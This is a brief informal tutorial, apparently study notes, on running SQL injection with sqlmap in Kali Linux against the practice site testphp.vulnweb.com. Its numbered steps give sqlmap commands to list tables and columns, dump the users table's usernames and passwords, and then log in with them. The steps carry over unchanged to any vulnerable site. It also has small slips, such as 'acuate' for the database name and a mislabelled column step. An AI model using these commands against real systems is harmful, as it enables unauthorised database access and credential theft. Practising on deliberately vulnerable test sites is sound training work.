SQL injection using sql map :

1) go to sqlmap in kali

2) go to root terminal of kali 

3) search vulnerable website from browser 
http://testphp.vulnweb.com/artists.php?artist=1 

4) we will get 2 databases we can use anyone from them , lets do using acuate

5) sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1  -D acuart --tables

6) to get no of columns : 
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1  -D acuart -T users --columns

7) To get username: sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1  -D acuart -T users -C uname --dump

8) To get password: sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1  -D acuart -T users -C pass --dump

9) similarly do for email and whatever table info you want

10) open vulnweb website put username and password and you can get info about database
